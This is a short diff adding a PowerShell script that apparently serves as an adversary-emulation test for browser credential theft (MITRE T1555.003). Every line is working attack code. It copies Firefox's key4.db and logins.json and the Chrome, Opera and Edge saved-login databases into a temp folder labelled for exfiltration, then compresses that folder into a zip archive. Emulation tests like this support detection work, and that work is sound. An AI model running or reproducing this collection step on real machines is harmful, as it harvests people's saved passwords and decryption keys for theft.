@@ -1,0 +1,10 @@
+$exfil_folder = "$env:temp\T1555.003"
+if (test-path "$exfil_folder") {} else {new-item -path "$env:temp" -Name "T1555.003" -ItemType "directory" -force}
+$FirefoxCredsLocation = get-childitem -path "$env:appdata\Mozilla\Firefox\Profiles\*.default-release\"
+if (test-path "$FirefoxCredsLocation\key4.db") {copy-item "$FirefoxCredsLocation\key4.db" -destination "$exfil_folder\T1555.003Firefox_key4.db"} else {}
+if (test-path "$FirefoxCredsLocation\logins.json") {copy-item "$FirefoxCredsLocation\logins.json" -destination "$exfil_folder\T1555.003Firefox_logins.json"} else {}
+if (test-path "$env:localappdata\Google\Chrome\User Data\Default\Login Data") {copy-item "$env:localappdata\Google\Chrome\User Data\Default\Login Data" -destination "$exfil_folder\T1555.003Chrome_Login Data"} else {}
+if (test-path "$env:localappdata\Google\Chrome\User Data\Default\Login Data For Account") {copy-item "$env:localappdata\Google\Chrome\User Data\Default\Login Data For Account" -destination "$exfil_folder\T1555.003Chrome_Login Data For Account"} else {}
+if (test-path "$env:appdata\Opera Software\Opera Stable\Login Data") {copy-item "$env:appdata\Opera Software\Opera Stable\Login Data" -destination "$exfil_folder\T1555.003Opera_Login Data"} else {}
+if (test-path "$env:localappdata/Microsoft/Edge/User Data/Default/Login Data") {copy-item "$env:localappdata/Microsoft/Edge/User Data/Default/Login Data" -destination "$exfil_folder\T1555.003Edge_Login Data"} else {} 
+compress-archive -path "$exfil_folder" -destinationpath "$exfil_folder.zip" -force
